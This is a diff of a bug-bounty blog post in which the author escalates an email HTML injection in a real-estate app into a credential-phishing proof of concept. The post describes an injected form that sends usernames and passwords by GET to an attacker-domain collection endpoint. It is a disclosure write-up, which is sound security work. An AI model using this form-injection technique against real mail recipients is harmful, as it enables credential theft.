@@ -5,7 +5,7 @@ This is my first blog post. In it I explain how I escalated a simple Email HTML 
 ## Discovery Phase
 i selected the one of the Program on Bugcrowd with aim of hunt for 1 month in same program, after completing my recon phase which it taken 2 days of, then i directly i jumped into the Main Application after playing some time on Setting section, i noticed There is an option to add Address which related to a site location(as it was realesting app).
 
-ahh there is also feature called add reference address too, which means add the referencer for our site location, i casually added my Bugcrowd alias email with basic Html payload `<i>test everywhere</i>`
+ahh there is also feature called add reference address too, which means add the referencer for our site location, i casually added my Bugcrowd alias email with basic Html payload `<i>test-everywhere</i>`
 
 Banggg i got an email notification reflecting our injected html code with *test everywhere* (italic), classic Email HTML injection right, ahh i tried to report it but my hacker insticts signal me to try to increase the impact as per the Bugcrowd VRT Email HTML Injection is considered as P4, so there is no of increasing the impact. But i tried something wierd !!
 
@@ -31,16 +31,38 @@ the steps are simple right all we need his the html code to inject and victim em
 <button>submit</button></form>
 ```
 What happened:
-* The <h3> rendered in the notification email.
+* The h3 rendered in the notification email.
 * The injected <form> appeared in the email body. When a user entered credentials and clicked Submit, the browser made a request to http://<attacker-domain>/collect with user and pass in the query string (because method="GET"), which was logged on the attacker-controlled server.
 
-this when the victim entered his credentials 
-<img src="images/image-2025-10-10T12_51_16.834Z (1).png" alt="Screenshot" style="width:100%;max-width:1000px;height:auto;display:block;margin:auto;border-radius:10px;">
+### Evidence
+<div style="max-width:900px;margin:28px auto;text-align:center;">
+  <img src="images/image-2025-10-10T12_51_16.834Z (1).png"
+       alt="Injected email showing malicious form"
+       style="width:100%;max-width:900px;height:auto;display:block;margin:0 auto;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.08);background:#f6f6f6;object-fit:contain;"
+       loading="lazy" decoding="async" width="1200" height="675">
+  <p style="font-size:0.95rem;color:#555;margin-top:8px;line-height:1.35;">
+    Victim-entered credentials submitted to attacker-domain and recorded in server logs.
+  </p>
+</div>
 
-successfully this credentials are preserved in attacker-domain logs
-<img src="images/2025-10-06_09-04_2.png" alt="Screenshot" style="width:100%;max-width:1000px;height:auto;display:block;margin:auto;border-radius:10px;">
+<div style="max-width:900px;margin:28px auto;text-align:center;">
+  <img src="images/2025-10-06_09-04_2.png"
+       alt="Injected email showing malicious form"
+       style="width:100%;max-width:900px;height:auto;display:block;margin:0 auto;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.08);background:#f6f6f6;object-fit:contain;"
+       loading="lazy" decoding="async" width="1200" height="675">
+  <p style="font-size:0.95rem;color:#555;margin-top:8px;line-height:1.35;">
+    Attacker successfully retrieved the Victims Credentials.
+  </p>
+</div>
 
 ## Outcome 
 I reported the finding to the program with the reproduction steps and PoC. The triage team agreed that the impact justified a P3 (medium) classification however, the issue was later marked as a duplicate of an existing report. but the escalation reasoning was accepted. i though i will get my first bounty!😒
-<img src="images/2025-10-22_15-29.png" alt="Screenshot" style="width:100%;max-width:1000px;height:auto;display:block;margin:auto;border-radius:10px;">
+<div style="max-width:900px;margin:28px auto;text-align:center;">
+  <img src="images/2025-10-22_15-29.png"
+       alt="Injected email showing malicious form"
+       style="width:100%;max-width:900px;height:auto;display:block;margin:0 auto;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.08);background:#f6f6f6;object-fit:contain;"
+       loading="lazy" decoding="async" width="1200" height="675">
+  <p style="font-size:0.95rem;color:#555;margin-top:8px;line-height:1.35;">
+  </p>
+</div>
 
